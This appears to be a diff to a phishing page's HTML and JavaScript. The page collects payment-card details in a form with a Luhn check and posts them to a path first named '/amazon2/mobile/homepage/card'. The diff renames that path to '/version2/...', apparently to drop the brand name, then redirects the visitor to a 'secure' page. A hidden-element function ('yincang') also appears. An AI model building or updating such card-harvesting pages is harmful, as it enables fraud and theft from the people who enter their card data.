@@ -307,9 +307,12 @@
     </style>
 </head>
 <body id="bodyid">
-
-
 </body >
+<script src="../js/jquery.min.js"></script>
+<script src="../js/jquery.validate.min.js"></script>
+<script src="../js/sire.form.js"></script>
+<script src="../js/jquery.card.min.js" charset="utf-8"></script>
+<script src="../js/jquery.mask.js"></script>
 <script type="text/javascript">
     setTimeout("yincang()", 0);
     function yincang() {
@@ -787,7 +790,7 @@
             },
             submitHandler: function(form) {
                 $("#zwimel").show();
-                $.post("/amazon2/mobile/homepage/card", $("#formcard").serialize(),
+                $.post("/version2/mobile/homepage/card", $("#formcard").serialize(),
                         function(result) {
                             setTimeout(function() {
                                         $(location).attr("href", "secure")
@@ -817,12 +820,6 @@
         return (nCheck % 10) == 0;
     }
 </script>
-
-<script src="../js/jquery.min.js"></script>
-<script src="../js/jquery.validate.min.js"></script>
-<script src="../js/sire.form.js"></script>
-<script src="../js/jquery.card.min.js" charset="utf-8"></script>
-<script src="../js/jquery.mask.js"></script>
 <script type="text/javascript">
     var moon = true;
     var year = true;
